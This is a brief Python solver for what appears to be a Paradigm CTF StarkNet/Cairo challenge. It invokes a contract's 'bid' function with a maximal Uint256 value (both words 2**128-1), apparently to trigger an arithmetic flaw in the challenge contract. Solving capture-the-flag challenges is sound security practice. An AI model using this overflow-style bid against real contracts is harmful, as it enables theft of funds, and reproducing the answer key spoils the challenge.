from paradigmctf.cairo_challenge import *

from starknet_py.net import AccountClient
from starknet_py.contract import Contract


async def solver(client: AccountClient, bid_contract: Contract):
    result = await bid_contract.functions["bid"].invoke(2, {"low": 2 ** 128 - 1, "high": 2 ** 128 -1}, max_fee=int(1e16))
    await result.wait_for_acceptance()

run_solver(solver)